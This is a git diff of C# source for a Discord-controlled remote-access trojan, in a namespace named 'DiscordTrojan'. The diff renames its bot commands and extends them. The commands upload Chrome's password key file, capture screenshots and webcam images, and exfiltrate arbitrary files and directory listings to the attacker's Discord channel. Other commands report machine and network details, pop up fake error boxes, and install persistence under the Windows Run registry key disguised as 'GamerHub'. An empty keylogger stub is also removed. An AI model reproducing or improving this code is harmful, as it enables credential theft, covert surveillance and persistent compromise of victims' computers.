@@ -16,6 +16,7 @@ using System.Threading;
 
 
 
+
 namespace DiscordTrojan
 {
     
@@ -78,16 +79,16 @@ namespace DiscordTrojan
         private Task CommandHandler(SocketMessage message)
         {
             //acctuall commands here
-            if (message.Content == "!ping")
+            if (message.Content == "!Ping")
             {
-                message.Channel.SendMessageAsync($@"pong, {message.Author.Mention}");
+                message.Channel.SendMessageAsync($@"Pong, {message.Author.Mention}");
             }
             
-            if (message.Content == "!help")
+            if (message.Content == "!Help" || message.Content == "!HELP" || message.Content == "!help")
             {
                 var help = new EmbedBuilder();
                 help.WithTitle("Help");
-                help.WithDescription("!ping - pong\n\n!ScreenShot - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
+                help.WithDescription("!Ping - Pong\n\n!ScreenShot - show photo of desktop\n\n!Chrome Passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
                 help.WithColor(Discord.Color.Teal);
                 message.Channel.SendMessageAsync("", false, help.Build());
             }
@@ -100,14 +101,16 @@ namespace DiscordTrojan
                 DeleteFunction(userPath + root + "\\Capture.jpg");
             }
 
-            if (message.Content == "!get chrome passwords")
+            if (message.Content == "!Chrome Passwords")
             {
                 message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
             }
 
             if (message.Content == "!Info")
             {
-                message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp());
+                message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp() + "\nOS version: "+ System.Environment.OSVersion+"\nProcessor count: " + System.Environment.ProcessorCount);
+               
+                
             }
 
             if (message.Content.StartsWith("!MessageBoxError"))
@@ -123,19 +126,23 @@ namespace DiscordTrojan
                 message.Channel.SendMessageAsync("Sent and read");
             }
 
-            if (message.Content.StartsWith("!send startup true"))
+            if (message.Content.StartsWith("!StartUp true"))
             {
                 Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
+                message.Channel.SendMessageAsync("StartUp true");
             }
 
-            if (message.Content.StartsWith("!send startup false"))
+            if (message.Content.StartsWith("!StartUp false"))
             {
                 Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 key.DeleteValue("GamerHub", false);
+                message.Channel.SendMessageAsync("StartUp false");
             }
 
-            if (message.Content.StartsWith("!get files"))
+           
+
+            if (message.Content.StartsWith("!Get Files"))
             {
                 var arg = message.Content.Split(new[] { "!get files" }, StringSplitOptions.None)[1];
                 try
@@ -154,7 +161,7 @@ namespace DiscordTrojan
                 }
             }
 
-            if (message.Content.StartsWith("!get file"))
+            if (message.Content.StartsWith("!Get File"))
             {
                 var arg = message.Content.Split(new[] { "!get file" }, StringSplitOptions.None)[1];
                 try
@@ -199,14 +206,7 @@ namespace DiscordTrojan
 
         void KeyLogger()
         {
-            while(true)
-            {
-                Thread.Sleep(100);
-                for(int i = 0; i < 255; i++)
-                {
 
-                }
-            }
         }
 
         // ************************ CAMERA ********************************
